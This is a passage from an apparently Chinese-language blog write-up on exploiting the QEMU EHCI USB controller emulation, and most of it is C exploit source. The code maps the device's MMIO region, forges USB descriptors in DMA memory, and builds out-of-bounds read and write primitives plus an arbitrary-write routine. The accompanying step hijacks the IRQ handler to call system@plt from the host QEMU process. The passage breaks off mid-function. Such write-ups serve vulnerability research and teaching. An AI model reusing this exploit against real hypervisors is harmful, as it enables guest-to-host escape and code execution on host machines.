&amp;s-&gt;ports[i], s, i, &amp;ehci_port_ops,<br>                          USB_SPEED_MASK_HIGH);<br>        s-&gt;ports[i].dev = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    s-&gt;frame_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, ehci_work_timer, s);<br>    s-&gt;async_bh = qemu_bh_new(ehci_work_bh, s);<br>    s-&gt;device = dev;<br><br>    s-&gt;vmstate = qemu_add_vm_change_state_handler(usb_ehci_vm_state_change, s);<br>&#125;<br><br></code></pre></td></tr></table></figure>



<ol start="3">
<li>利用任意写将<code>EHCIState-&gt;irq</code>内容填充为伪造的irq地址，将handler 填充成<code>system@plt</code>地址，<code>opaque</code>填充成参数的地址。其调用链如下：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ehci_advance_periodic_static -&gt; ehci_advance_state -&gt; ehci_reset -&gt; usb_detach -&gt; ehci_detach -&gt; ehci_raise_irq -&gt; ehci_update_irq -&gt; qemu_set_irq<br></code></pre></td></tr></table></figure>



<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> * <span class="hljs-title">qh</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> * <span class="hljs-title">qtd</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ohci_td</span> * <span class="hljs-title">td</span>;</span><br><span class="hljs-type">char</span> *dmabuf;<br><span class="hljs-type">char</span> *setup_buf;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *mmio_mem;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data_buf;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data_buf_oob;<br><span class="hljs-type">uint32_t</span> *entry;<br><span class="hljs-type">uint64_t</span> dev_addr;<br><span class="hljs-type">uint64_t</span> data_buf_addr;<br><span class="hljs-type">uint64_t</span> USBPort_addr; <br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PRESET       (1 &lt;&lt; 8)     <span class="hljs-comment">// Port Reset</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PED          (1 &lt;&lt; 2)     <span class="hljs-comment">// Port Enable/Disable</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_RUNSTOP      (1 &lt;&lt; 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_PSE          (1 &lt;&lt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_OUT         0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_IN          0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_ACTIVE    (1 &lt;&lt; 7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_SETUP     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_IN        1 <span class="hljs-comment">/* device -&gt; host */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_OUT       0 <span class="hljs-comment">/* host -&gt; device */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_TBYTES_SH 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_PID_SH    8</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span> <span class="hljs-title">USBDevice</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBEndpoint</span> <span class="hljs-title">USBEndpoint</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBEndpoint</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span> nr;<br>    <span class="hljs-type">uint8_t</span> pid;<br>    <span class="hljs-type">uint8_t</span> type;<br>    <span class="hljs-type">uint8_t</span> ifnum;<br>    <span class="hljs-type">int</span> max_packet_size;<br>    <span class="hljs-type">int</span> max_streams;<br>    <span class="hljs-type">bool</span> pipeline;<br>    <span class="hljs-type">bool</span> halted;<br>    USBDevice *dev;<br>    USBEndpoint *fd;<br>    USBEndpoint *bk;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span> &#123;</span><br>    <span class="hljs-type">int32_t</span> remote_wakeup;<br>    <span class="hljs-type">int32_t</span> setup_state;<br>    <span class="hljs-type">int32_t</span> setup_len;<br>    <span class="hljs-type">int32_t</span> setup_index;<br><br>    USBEndpoint ep_ctl;<br>    USBEndpoint ep_in[<span class="hljs-number">15</span>];<br>    USBEndpoint ep_out[<span class="hljs-number">15</span>];<br>&#125;;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br><br>    <span class="hljs-comment">/* endpoint characteristics */</span><br>    <span class="hljs-type">uint32_t</span> epchar;<br><br>    <span class="hljs-comment">/* endpoint capabilities */</span><br>    <span class="hljs-type">uint32_t</span> epcap;<br><br>    <span class="hljs-type">uint32_t</span> current_qtd;             <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> next_qtd;                <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext_qtd;<br><br>    <span class="hljs-type">uint32_t</span> token;                   <span class="hljs-comment">/* Same as QTD token */</span><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqh;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext;                 <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> token;<br><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqtd;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">virt2phys</span><span class="hljs-params">(<span class="hljs-type">void</span>* p)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> virt = (<span class="hljs-type">uint64_t</span>)p;<br><br>    <span class="hljs-comment">// Assert page alignment</span><br><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>        die(<span class="hljs-string">&quot;open&quot;</span>);<br>    <span class="hljs-type">uint64_t</span> offset = (virt / <span class="hljs-number">0x1000</span>) * <span class="hljs-number">8</span>;<br>    lseek(fd, offset, SEEK_SET);<br><br>    <span class="hljs-type">uint64_t</span> phys;<br>    <span class="hljs-keyword">if</span> (read(fd, &amp;phys, <span class="hljs-number">8</span> ) != <span class="hljs-number">8</span>)<br>        die(<span class="hljs-string">&quot;read&quot;</span>);<br>    <span class="hljs-comment">// Assert page present</span><br><br>    phys = (phys &amp; ((<span class="hljs-number">1ULL</span> &lt;&lt; <span class="hljs-number">54</span>) - <span class="hljs-number">1</span>)) * <span class="hljs-number">0x1000</span>+(virt&amp;<span class="hljs-number">0xfff</span>);<br><br>    close(fd);<br>    <span class="hljs-keyword">return</span> phys;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">die</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg)</span><br>&#123;<br>    perror(msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint64_t</span>*)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br><br>    <span class="hljs-type">int</span> mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:1d.7/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    <span class="hljs-keyword">if</span> (mmio_fd == <span class="hljs-number">-1</span>)<br>        die(<span class="hljs-string">&quot;mmio_fd open failed&quot;</span>);<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>        die(<span class="hljs-string">&quot;mmap mmio_mem failed&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mmio_mem: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)mmio_mem);<br>    <br><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; ++i)<br>    &#123;<br>        dmabuf = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x3000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (dmabuf == MAP_FAILED)<br>            die(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        *(<span class="hljs-type">char</span> *)dmabuf = <span class="hljs-string">&#x27;a&#x27;</span>;<br>        *(<span class="hljs-type">char</span> *)(dmabuf + <span class="hljs-number">0x1000</span>) = <span class="hljs-string">&#x27;b&#x27;</span>;<br>        *(<span class="hljs-type">char</span> *)(dmabuf + <span class="hljs-number">0x2000</span>) = <span class="hljs-string">&#x27;c&#x27;</span>;<br>    <br>        entry = dmabuf + <span class="hljs-number">4</span>;<br>        qh = dmabuf + <span class="hljs-number">0x100</span>;<br>        qtd = dmabuf + <span class="hljs-number">0x200</span>;<br>        setup_buf = dmabuf + <span class="hljs-number">0x300</span>;<br>        data_buf = dmabuf + <span class="hljs-number">0x1000</span>;<br>        data_buf_oob = dmabuf + <span class="hljs-number">0x2000</span>;<br><br>        <span class="hljs-comment">// printf(&quot;phy_data_buf: 0x%lx\t phy_data_buf_oob: 0x%lx\n&quot;, virt2phys(data_buf), virt2phys(data_buf_oob));</span><br><br>        <span class="hljs-keyword">if</span>(virt2phys(data_buf) + <span class="hljs-number">0x1000</span> == virt2phys(data_buf_oob))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dmabuf: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)dmabuf);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phy_dmabuf: 0x%lx\n&quot;</span>, virt2phys(dmabuf));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)data_buf);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phy_data_buf: 0x%lx\n&quot;</span>, virt2phys(data_buf));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data_buf_oob: 0x%lx\n&quot;</span>, (<span class="hljs-type">uint64_t</span>)data_buf_oob);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;phy_data_buf_oob: 0x%lx\n&quot;</span>, virt2phys(data_buf_oob));<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(i == <span class="hljs-number">0x1000</span>)<br>    &#123;<br>        die(<span class="hljs-string">&quot;Unable to find a contiguous physical address!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;init Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">reset_enable_port</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_EHCIState</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x2C</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">// frindex</span><br>    mmio_write(<span class="hljs-number">0x34</span>, virt2phys(dmabuf));    <span class="hljs-comment">// periodiclistbase</span><br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);      <span class="hljs-comment">// usbcmd</span><br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_qh</span><span class="hljs-params">()</span>&#123;<br>    qh-&gt;epchar = <span class="hljs-number">0x00</span>;<br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = virt2phys(qtd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_state</span><span class="hljs-params">()</span>&#123;<br>    reset_enable_port();<br>    set_qh();<br><br>    setup_buf[<span class="hljs-number">6</span>] = <span class="hljs-number">0xff</span>;<br>    setup_buf[<span class="hljs-number">7</span>] = <span class="hljs-number">0x0</span>;<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">8</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(setup_buf);<br><br>    *entry = virt2phys(qh)+<span class="hljs-number">0x2</span>;<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;init_state Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_length</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> len,<span class="hljs-type">uint8_t</span> option)</span>&#123;<br><br>    reset_enable_port();<br><br>    set_qh();<br><br>    setup_buf[<span class="hljs-number">0</span>] = option;<br>    setup_buf[<span class="hljs-number">6</span>] = len &amp; <span class="hljs-number">0xff</span>;<br>    setup_buf[<span class="hljs-number">7</span>] = (len &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">8</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(setup_buf);<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;set_length Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_copy_read</span><span class="hljs-params">()</span>&#123;<br><br>    reset_enable_port();<br>    set_qh();<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_IN &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x1e00</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = virt2phys(data_buf_oob);<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do_copy_read Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_copy_write</span><span class="hljs-params">(<span class="hljs-type">int</span> offset, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> setup_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> setup_index)</span>&#123;<br><br>    reset_enable_port();<br>    set_qh();<br><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(data_buf_oob + offset) = <span class="hljs-number">0x0000000200000002</span>; <span class="hljs-comment">// 覆盖成原先的内容</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(data_buf_oob + <span class="hljs-number">0x8</span> +offset) = setup_len; <span class="hljs-comment">//setup_len</span><br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(data_buf_oob + <span class="hljs-number">0xc</span>+ offset) = setup_index;<br><br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_OUT &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x1e00</span> &lt;&lt; QTD_TOKEN_TBYTES_SH; <span class="hljs-comment">// flag</span><br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = virt2phys(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = virt2phys(data_buf_oob);<br><br>    set_EHCIState();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do_copy_write Success!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_state_data</span><span class="hljs-params">()</span><br>&#123;<br>    set_length(<span class="hljs-number">0x500</span>, USB_DIR_OUT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> target_addr, <span class="hljs-type">uint64_t</span> payload)</span><br>&#123;<br>    setup_state_data();<br><br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset = target_addr - data_buf_addr;<br>    